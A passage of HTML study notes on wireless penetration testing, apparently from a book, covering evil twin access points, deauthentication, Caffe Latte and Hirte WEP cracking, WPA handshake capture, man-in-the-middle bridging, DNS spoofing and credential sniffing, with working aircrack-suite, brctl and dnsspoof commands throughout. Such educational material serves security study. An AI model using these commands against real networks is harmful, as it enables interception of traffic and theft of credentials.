+<li><code>airbase-ng --essid "&lt;ESSID&gt;" -c 3 mon0</code></li>
+<li>Client is still connected to the legitimate AP</li>
+<li><code>aireplay-ng --deauth 0 -a &lt;AP BSSID&gt; mon0</code> to de-auth the
+client</li>
+<li>If our AP's signal is stronger, the client connects to the
+fake AP</li>
+</ul></li>
+</ul>
+
+<h2 id="caffe-latte-attack">Caffe Latte attack</h2>
+
+<ul>
+<li>Clients continuously probe for SSIDs they have previously
+connected to</li>
+<li>WEP keys are stored by the client</li>
+</ul>
+
+<h2 id="conducting-the-caffe-latte-attack">Conducting the Caffe Latte attack</h2>
+
+<ul>
+<li>When there's an unassociated client</li>
+<li><code>airbase-ng -c 3 -a &lt;AP BSSID&gt; -e "&lt;SSID&gt;" -L -W 1 mon0</code></li>
+<li>start airodump-ng to collect packets from this AP</li>
+<li>start aircrack-ng to crack
+<ul>
+<li><code>aircrack-ng &lt;path to cap file&gt;</code></li>
+</ul></li>
+<li>The attack works by bit flipping and replaying ARP packets</li>
+<li>The replayed ARPs generate more ARPs to be sent</li>
+<li>These ARPs are encrypted by the WEP key stored on the client</li>
+</ul>
+
+<h2 id="de-authentication-and-dis-association-attacks">De-Authentication and Dis-Association attacks</h2>
+
+<ul>
+<li>Earlier we used de-auth attacks in the AP context</li>
+<li>This time it will be in the client context</li>
+</ul>
+
+<h2 id="de-authenticating-the-client">De-Authenticating the client</h2>
+
+<ul>
+<li>Run airodump-ng to find the client</li>
+<li><code>aireplay-ng --deauth 1 -c &lt;client MAC&gt; -a &lt;AP BSSID&gt; mon0</code></li>
+<li>Client is disconnected and tried to reconnect</li>
+<li>This works on both WEP and WPA/WPA2</li>
+</ul>
+
+<h2 id="dis-association-attack-on-the-client">Dis-Association attack on the client</h2>
+
+<ul>
+<li>You can also use de-auth packets to achieve the same thing</li>
+</ul>
+
+<h2 id="hirte-attack">Hirte attack</h2>
+
+<ul>
+<li>It's like the Caffe Latte attack, but uses fragmentation
+techniques to allow almost any packet to be used</li>
+<li><code>airbase-ng -c 3 -a &lt;AP BSSID&gt; -e "&lt;SSID&gt;" -W 1 -N mon0</code></li>
+<li><code>airodump-ng -c 3 --bssid &lt;AP BSSID&gt; --write &lt;output&gt; mon0</code>
+in a separate terminal</li>
+<li>Once a roaming client connects to the honeypot AP,
+the Hirte attack is launched</li>
+<li>Use aircrack-ng to crack the WEP key</li>
+</ul>
+
+<h2 id="ap-less-wpa-personal-cracking">AP-less WPA-Personal cracking</h2>
+
+<ul>
+<li>Earlier we captured the four-way WPA handshake and a
+dictionary to crack the PSK</li>
+<li>To crack WPA, we need four packets:
+<ul>
+<li>Authenticator nounce</li>
+<li>Supplicant nounce</li>
+<li>Authenticator MAC</li>
+<li>Supplicant MAC</li>
+</ul></li>
+<li>To crack WPA we need just packets 1 &amp; 2 or just 2 &amp; 3</li>
+<li>So, we make a honeypot AP that will receive packets
+1 and 2 (we can't send packet 3 without the PSK)</li>
+</ul>
+
+<h2 id="ap-less-wpa-cracking">AP-less WPA cracking</h2>
+
+<ul>
+<li><code>airbase-ng -c 3 -a &lt;AP BSSID&gt; -e "&lt;SSID&gt;" -W 1 -z 2 mon0</code>
+-z 2 creates a WPA-PSK AP with TKIP encryption</li>
+<li><code>airodump-ng -c 3 --bssid &lt;AP BSSID&gt; --write &lt;out&gt; mon0</code></li>
+<li>Client connects and the handshake fails, but we got what we
+needed</li>
+<li>airodump-ng shows that a handshake has been captured</li>
+<li>Run the airodump-ng capture file through aircrack-ng with
+a dictionary</li>
+<li>If the password is in the dictionary, it'll be cracked</li>
+</ul>
+
+<h1 id="chapter-7-advanced-wlan-attacks">Chapter 7: Advanced WLAN Attacks</h1>
+
+<ul>
+<li>Man-in-the-Middle attack</li>
+<li>Wireless Eavesdropping using MITM</li>
+<li>Session Hijacking using MITM</li>
+</ul>
+
+<h2 id="man-in-the-middle-attack">Man-in-the-Middle attack</h2>
+
+<ul>
+<li>One of the most potent attacks on a WLAN system</li>
+<li>For our purposes we'll assume:
+<ul>
+<li>Attacker is connected to a wired network</li>
+<li>Attacker creates an evil twin AP</li>
+<li>Attacker forwards user traffic using the bridge between the
+wireless and wired interfaces</li>
+</ul></li>
+</ul>
+
+<h2 id="man-in-the-middle-attack-2">Man-in-the-Middle attack</h2>
+
+<ul>
+<li><code>airbase=ng --essid mitm -c 11 mon0</code> to create a soft access
+point</li>
+<li>This creates an at0 interface (<code>ifconfig</code> to verify)</li>
+<li>Bridge between eth0 (wired) and at0:
+<ul>
+<li><code>brctl addbr mitm-bridge</code></li>
+<li><code>brctl addif mitm-bridge eth0</code></li>
+<li><code>brctl addif mitm-bridge at0</code></li>
+<li><code>ifconfig eth0 0.0.0.0 up</code></li>
+<li><code>ifconfig at0 0.0.0.0 up</code></li>
+<li><code>ifconfig mitm-bridge 192.168.0.199 up</code> to assign IP
+address</li>
+<li><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code> to turn on
+IP forwarding</li>
+</ul></li>
+<li>In Wireshark, start sniffing on the at0 interface</li>
+<li>Pinging the gateway address from the client machine
+goes through our at0 interface even if it's not destined
+for us</li>
+</ul>
+
+<h2 id="man-in-the-middle-over-pure-wireless">Man-in-the-Middle over pure wireless</h2>
+
+<ul>
+<li>You could simultaneously host an AP and connect wirelessly
+to another AP</li>
+<li>You would need two wireless cards though</li>
+</ul>
+
+<h2 id="wireless-eavesdropping-using-mitm">Wireless Eavesdropping using MITM</h2>
+
+<ul>
+<li>We assume that all the victim's traffic is routed through
+our computer</li>
+</ul>
+
+<h2 id="wireless-eavesdropping">Wireless eavesdropping</h2>
+
+<ul>
+<li>Replicate the whole MITM setup</li>
+<li>Start sniffing on the at0 interface using Wireshark</li>
+<li>When a client opens a webpage:
+<ul>
+<li>Wireshark shows a bunch of new packets</li>
+<li>You can filter for HTTP traffic only (<code>http</code> filter)</li>
+<li>Check out POST requests for credentials</li>
+<li>They're often encrypted/hashed. This is beyond the scope
+of this book.</li>
+<li>You can still eavesdrop on Google searches and other
+plain-text requests though</li>
+</ul></li>
+</ul>
+
+<h2 id="session-hijacking-over-wireless">Session Hijacking over wireless</h2>
+
+<ul>
+<li>During MITM, the attacker has full control over the
+clients' packets</li>
+<li>So, he can modify the packets. However, they may be
+encrypted or protected from tampering.</li>
+<li>We will demonstrate a DNS hijack to hijack the browser
+session to Google.com</li>
+</ul>
+
+<h2 id="session-hijacking-over-wireless-2">Session hijacking over wireless</h2>
+
+<ul>
+<li>Set up the MITM config</li>
+<li>When a client connects to google.com in his browser:
+<ul>
+<li>In Wireshark, apply the <code>dns</code> filter</li>
+<li>You should see packets with DNS requests for google.com</li>
+<li><code>dnsspoof -i mitm-bridge</code> to send fake DNS responses</li>
+<li>This replaces the google.com IP by the attacker's IP</li>
+<li>Launch a web server at port 80 on the attacker machine</li>
+</ul></li>
+<li>Check out Ettercap, a great tool to modify packet data</li>
+</ul>
+
+<h2 id="finding-security-configurations-on-the-client">Finding security configurations on the client</h2>
+
+<ul>
+<li>We've seen how to make honeypots for open APs, WEP, and WPA</li>
+<li>How to check to which network an SSID belongs using
+clients' Probe Requests?
+<ul>
+<li>Create access points with the same SSID but with
+different security configurations</li>
+</ul></li>
+</ul>
+
+<h2 id="enumerating-wireless-security-profiles">Enumerating wireless security profiles</h2>
+
+<ul>
+<li>Assume client is sending Probe Requests for a certain SSID
+when it's not connected to it</li>
+<li>We will assume that the client thinks it's either an
+open, WEP, or WPA-PSK/WPA2-PSK network.</li>
+<li>So, we create four distinct APs</li>
+<li><code>airmon-ng start wlan0</code> multiple times to create interfaces
+mon0 to mon3</li>
+<li><code>ifconfig -a</code> to view all interfaces</li>
+<li><code>airbase-ng --essid "&lt;SSID&gt;" -a AA:AA:AA:AA:AA:AA -c 3 mon0</code>
+to create the open AP</li>
+<li><code>airbase-ng --essid "&lt;SSID&gt;" -c 3 -a BB:BB:BB:BB:BB:BB
+-W 1 mon1</code> for WEP AP</li>
+<li><code>airbase-ng --essid "&lt;SSID&gt;" -c 3 -a CC:CC:CC:CC:CC:CC
+-W 1 -z 2 mon2</code> for WPA-PSK AP</li>
+<li><code>airbase-ng --essid "&lt;SSID&gt;" -c 3 -a DD:DD:DD:DD:DD:DD
+-W 1 -Z 2 mon3</code> for WPA2-PSK AP</li>
+<li>Run airodump-ng to check the four newly created APs</li>
+<li>A roaming client will now connect to one of these 4 APs
+when it searches for that specific SSID</li>
+</ul>
+
+<h1 id="chapter-8-attacking-wpa-enterprise-and-radius">Chapter 8: Attacking WPA-Enterprise and RADIUS</h1>
+
+<h2 id="setting-up-freeradius">Setting up FreeRadius</h2>
+</body>
+</html>
